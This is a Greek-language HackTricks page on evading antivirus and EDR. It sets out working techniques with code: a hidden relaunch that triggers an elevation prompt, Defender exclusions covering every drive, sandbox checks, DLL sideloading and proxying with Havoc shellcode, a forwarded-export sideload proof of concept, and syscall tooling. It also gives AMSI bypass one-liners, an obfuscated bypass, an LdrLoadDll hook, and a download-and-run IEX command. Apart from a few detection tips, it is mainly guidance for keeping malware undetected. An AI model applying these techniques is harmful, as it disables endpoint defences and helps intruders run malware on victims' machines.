# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα tool για τη διακοπή λειτουργίας του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα tool για τη διακοπή λειτουργίας του Windows Defender, προσποιούμενο ότι υπάρχει άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait πριν από την παραποίηση του Defender

Οι public loaders που μεταμφιέζονται ως game cheats συχνά διανέμονται ως unsigned Node.js/Nexe installers, οι οποίοι πρώτα **ζητούν από τον χρήστη elevation** και μόνο μετά εξουδετερώνουν το Defender. Η ροή είναι απλή:

1. Ελέγχει αν υπάρχει administrative context με το `net session`. Η εντολή ολοκληρώνεται με επιτυχία μόνο όταν ο caller έχει δικαιώματα admin, επομένως η αποτυχία δείχνει ότι ο loader εκτελείται ως standard user.
2. Κάνει αμέσως relaunch τον εαυτό του με το verb `RunAs`, ώστε να ενεργοποιήσει το αναμενόμενο UAC consent prompt, διατηρώντας παράλληλα την αρχική command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Τα θύματα πιστεύουν ήδη ότι εγκαθιστούν «cracked» software, οπότε η προτροπή συνήθως γίνεται αποδεκτή, παρέχοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.

### Καθολικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσουν elevated δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα blind spots του Defender αντί να απενεργοποιήσουν εξ ολοκλήρου την υπηρεσία. Αρχικά, ο loader τερματίζει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε κάθε user profile, system directory και removable disk να μην μπορεί να σαρωθεί:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Ο βρόχος διατρέχει κάθε προσαρτημένο filesystem (D:\, E:\, USB sticks κ.λπ.), επομένως **οποιοδήποτε μελλοντικό payload τοποθετηθεί οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προνοητικός — οι attackers διατηρούν την επιλογή να φορτώσουν unsigned drivers αργότερα, χωρίς να χρειαστεί να αγγίξουν ξανά το Defender.
- Όλες οι αλλαγές καταγράφονται στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας στα επόμενα stages να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Καθώς καμία υπηρεσία του Defender δεν σταματά, οι απλοϊκοί health checks συνεχίζουν να αναφέρουν “antivirus active”, παρόλο που η real-time επιθεώρηση δεν ελέγχει ποτέ αυτές τις διαδρομές.

## **AV Evasion Methodology**

Προς το παρόν, τα AVs χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι malicious ή όχι: static detection, dynamic analysis και, για τα πιο προηγμένα EDRs, behavioural analysis.

### **Static detection**

Το Static detection επιτυγχάνεται με την επισήμανση γνωστών malicious strings ή arrays από bytes σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών public tools μπορεί να σας κάνει detect ευκολότερα, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως malicious. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτού του είδους το detection:

- **Encryption**

Αν κάνετε encrypt το binary, δεν θα υπάρχει τρόπος για το AV να ανιχνεύσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιου είδους loader για να κάνει decrypt και να εκτελέσει το πρόγραμμα στη μνήμη.

- **Obfuscation**

Μερικές φορές το μόνο που χρειάζεται είναι να αλλάξετε ορισμένα strings στο binary ή το script σας, ώστε να περάσει το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας tools, δεν θα υπάρχουν γνωστά bad signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε το Windows Defender static detection είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το αρχείο σε πολλά segments και ζητά από το Defender να σκανάρει το καθένα ξεχωριστά. Με αυτόν τον τρόπο, μπορεί να σας δείξει ακριβώς ποια strings ή bytes στο binary σας έχουν επισημανθεί.

Συνιστώ ιδιαίτερα να δείτε αυτή την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με το practical AV Evasion.

### **Dynamic analysis**

Το Dynamic analysis είναι όταν το AV εκτελεί το binary σας σε ένα sandbox και παρακολουθεί για malicious activity (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των passwords του browser σας, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο, αλλά υπάρχουν ορισμένα πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Sleep before execution** Ανάλογα με τον τρόπο υλοποίησης, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης του AV dynamic analysis. Τα AVs έχουν πολύ λίγο χρόνο για να σκανάρουν αρχεία, ώστε να μην διακόπτουν τη ροή εργασίας του χρήστη, επομένως τα μεγάλα sleeps μπορούν να διαταράξουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παρακάμψουν το sleep, ανάλογα με τον τρόπο υλοποίησής του.
- **Checking machine's resources** Συνήθως τα Sandboxes έχουν πολύ περιορισμένους πόρους στη διάθεσή τους (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το machine του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία του CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων· δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Machine-specific checks** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου το workstation είναι joined στο domain "contoso.local", μπορείτε να κάνετε έναν έλεγχο στο domain του υπολογιστή για να δείτε αν ταιριάζει με αυτό που έχετε καθορίσει. Αν δεν ταιριάζει, μπορείτε να κάνετε το πρόγραμμά σας exit.

Αποδεικνύεται ότι το computername του Microsoft Defender's Sandbox είναι HAL9TH. Έτσι, μπορείτε να ελέγξετε το computer name στο malware σας πριν από το detonation. Αν το όνομα είναι HAL9TH, αυτό σημαίνει ότι βρίσκεστε μέσα στο defender's sandbox, επομένως μπορείτε να κάνετε το πρόγραμμά σας exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικά ακόμη πολύ καλά tips από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Όπως αναφέραμε και προηγουμένως σε αυτό το post, τα **public tools** τελικά θα **ανιχνευθούν**, επομένως πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεστε πραγματικά το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα διαφορετικό project που είναι λιγότερο γνωστό και επίσης κάνει dump το LSASS;

Η σωστή απάντηση πιθανότατα είναι η δεύτερη. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανότατα ένα από τα — αν όχι το πιο — flagged pieces of malware από τα AVs και EDRs. Παρόλο που το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χρησιμοποιήσετε για να παρακάμψετε τα AVs. Επομένως, απλώς αναζητήστε alternatives για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, βεβαιωθείτε ότι έχετε **απενεργοποιήσει το automatic sample submission** στο Defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΚΑΝΕΤΕ UPLOAD ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι να επιτύχετε evasion μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας ανιχνεύεται από ένα συγκεκριμένο AV, εγκαταστήστε το σε ένα VM, προσπαθήστε να απενεργοποιήσετε το automatic sample submission και δοκιμάστε το εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατό, να **προτιμάτε πάντα τη χρήση DLLs για evasion**. Από την εμπειρία μου, τα DLL files συνήθως **ανιχνεύονται και αναλύονται πολύ λιγότερο**, επομένως είναι ένα πολύ απλό trick για την αποφυγή του detection σε ορισμένες περιπτώσεις (αν φυσικά το payload σας μπορεί να εκτελεστεί ως DLL).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά tricks που μπορείτε να χρησιμοποιήσετε με DLL files, ώστε να γίνετε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας τόσο την victim application όσο και τα malicious payload(s) το ένα δίπλα στο άλλο.

Μπορείτε να ελέγξετε για προγράμματα που είναι ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που είναι ευάλωτα σε DLL Hijacking/Sideloading**. Αυτή η τεχνική είναι αρκετά stealthy όταν εκτελείται σωστά, αλλά αν χρησιμοποιήσετε δημοσίως γνωστά DLL Sideloadable προγράμματα, μπορεί να εντοπιστείτε εύκολα.

Απλώς τοποθετώντας ένα malicious DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα, το payload σας δεν θα φορτωθεί, καθώς το πρόγραμμα αναμένει ορισμένες συγκεκριμένες functions μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το ζήτημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που πραγματοποιεί ένα πρόγραμμα από το proxy (και malicious) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό DLL μετονομασμένο.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (encoded με το [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα το θεωρούσα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σου **συνιστώ ανεπιφύλακτα** να παρακολουθήσεις το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και το [video του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθεις περισσότερα και σε μεγαλύτερο βάθος σχετικά με όσα συζητήσαμε.

### Abusing Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να κάνουν export functions που είναι στην πραγματικότητα "forwarders": αντί να δείχνει σε κώδικα, το export entry περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller κάνει resolve το export, ο Windows loader:

- Κάνει load το `TargetDll`, αν δεν έχει ήδη φορτωθεί
- Κάνει resolve το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσεις:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο namespace KnownDLLs (π.χ. ntdll, kernelbase, ole32).
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική DLL search order, η οποία περιλαμβάνει τον κατάλογο του module που εκτελεί το forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρες ένα signed DLL που κάνει export μια function forwarded σε ένα non-KnownDLL module name και τοποθέτησε αυτό το signed DLL στον ίδιο κατάλογο με ένα attacker-controlled DLL που έχει ακριβώς το ίδιο όνομα με το forwarded target module. Όταν γίνει invoke το forwarded export, ο loader κάνει resolve το forward και φορτώνει το DLL σου από τον ίδιο κατάλογο, εκτελώντας το `DllMain` σου.

Παράδειγμα που παρατηρήθηκε στα Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο system DLL σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- Το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain`
- Αν το `SetAuditingInterface` δεν έχει υλοποιηθεί, θα εμφανιστεί σφάλμα "missing API" μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Hunting tips:
- Εστιάστε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται κάτω από το `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να κάνετε enumerate τα forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το inventory των Windows 11 forwarders για να αναζητήσετε υποψήφιες περιπτώσεις: https://hexacorn.com/d/apis_fwd.txt

Ιδέες για Detection/defense:
- Παρακολουθήστε τα LOLBins (π.χ. `rundll32.exe`) που φορτώνουν signed DLLs από non-system paths και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο base name από αυτόν τον κατάλογο
- Δημιουργήστε alert για process/module chains όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε user-writable paths
- Επιβάλετε code integrity policies (WDAC/AppLocker) και απαγορεύστε write+execute σε application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα payload toolkit για την παράκαμψη των EDRs με χρήση suspended processes, direct syscalls και alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealthy τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το Evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού: κάτι που λειτουργεί σήμερα μπορεί να ανιχνεύεται αύριο, επομένως μην βασίζεστε ποτέ σε ένα μόνο εργαλείο· αν είναι δυνατόν, δοκιμάστε να συνδυάζετε πολλαπλές τεχνικές evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Τα EDRs συχνά τοποθετούν **user-mode inline hooks** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και πραγματοποιούν μετάβαση σε kernel mode χωρίς να εκτελούν το hooked export entrypoint.

**Επιλογές invocation:**
- **Direct (embedded)**: εισάγει μια εντολή `syscall`/`sysenter`/`SVC #0` στο generated stub (χωρίς πρόσβαση σε export του `ntdll`).
- **Indirect**: κάνει jump σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion)· το **randomized indirect** επιλέγει ένα gadget από ένα pool σε κάθε κλήση.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στον δίσκο· εντοπίζει μια syscall sequence κατά το runtime.

**Hook-resistant στρατηγικές SSN resolution:**
- **FreshyCalls (VA sort)**: συμπεραίνει τα SSNs ταξινομώντας τα syscall stubs με βάση τη virtual address, αντί να διαβάζει τα stub bytes.
- **SyscallsFromDisk**: κάνει map ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSNs από το `.text` και, στη συνέχεια, κάνει unmap (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδυάζει SSN inference με ταξινόμηση VA και opcode validation όταν ένα stub είναι καθαρό· αν είναι hooked, χρησιμοποιεί VA inference ως fallback.
- **HW Breakpoint**: τοποθετεί το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά το runtime, χωρίς parsing hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέπει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώνουν μόνο **αρχεία στον δίσκο**, οπότε, αν μπορούσατε με κάποιον τρόπο να εκτελέσετε payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα παρακάτω στοιχεία των Windows.

- User Account Control, ή UAC (ανύψωση δικαιωμάτων για εγκατάσταση EXE, COM, MSI ή ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας τα περιεχόμενά τους σε μορφή που είναι τόσο μη κρυπτογραφημένη όσο και μη obfuscated.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την παρακάτω ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει ως πρόθεμα το `amsi:` και στη συνέχεια τη διαδρομή προς το executable από το οποίο εκτελέστηκε το script, σε αυτήν την περίπτωση το powershell.exe

Δεν αφήσαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από το **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για τη φόρτωση in-memory execution. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) για in-memory execution, αν θέλετε να παρακάμψετε το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:

- **Obfuscation**

Καθώς το AMSI λειτουργεί κυρίως με static detections, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για την αποφυγή του detection.

Ωστόσο, το AMSI έχει τη δυνατότητα να κάνει unobfuscate τα scripts, ακόμη και αν έχουν πολλά layers, επομένως το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο με τον οποίο πραγματοποιείται. Αυτό καθιστά την αποφυγή detection όχι και τόσο straightforward. Παρ' όλα αυτά, μερικές φορές το μόνο που χρειάζεται είναι να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει, οπότε αυτό εξαρτάται από το πόσο έντονα έχει γίνει flag κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται με τη φόρτωση ενός DLL στη διεργασία του powershell (καθώς και των cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να γίνει tamper με αυτό, ακόμη και όταν εκτελείται από unprivileged user. Λόγω αυτού του flaw στην υλοποίηση του AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους για να παρακάμπτουν το AMSI scanning.

**Forcing an Error**

Η εξαναγκασμένη αποτυχία της αρχικοποίησης του AMSI (amsiInitFailed) έχει ως αποτέλεσμα να μην ξεκινά κανένα scan για την τρέχουσα διεργασία. Αρχικά αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε ένα signature για να αποτρέψει την ευρύτερη χρήση του.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Αρκούσε μία γραμμή κώδικα PowerShell για να καταστήσει το AMSI μη χρήσιμο για την τρέχουσα διεργασία PowerShell. Αυτή η γραμμή έχει, φυσικά, εντοπιστεί από το ίδιο το AMSI, επομένως απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Να έχετε υπόψη ότι αυτό πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτή η ανάρτηση, επομένως δεν θα πρέπει να δημοσιεύσετε κώδικα αν το σχέδιό σας είναι να παραμείνετε undetected.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει την εύρεση της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση της εισόδου που παρέχεται από τον χρήστη) και την αντικατάστασή της με instructions που επιστρέφουν τον κωδικό για το E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης επιστρέφει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για το bypass του AMSI με powershell. Δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα σχετικά με αυτές.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στην τρέχουσα διεργασία. Ένα robust, language-agnostic bypass είναι η τοποθέτηση ενός user-mode hook στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν το ζητούμενο module είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται scans για τη συγκεκριμένη διεργασία.

Περίγραμμα υλοποίησης (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders alike (οτιδήποτε διαφορετικά θα φόρτωνε το AMSI).
- Συνδυάζεται με την εισαγωγή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για την αποφυγή μεγάλων command-line artefacts.
- Έχει παρατηρηθεί σε loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για την παράκαμψη του AMSI.
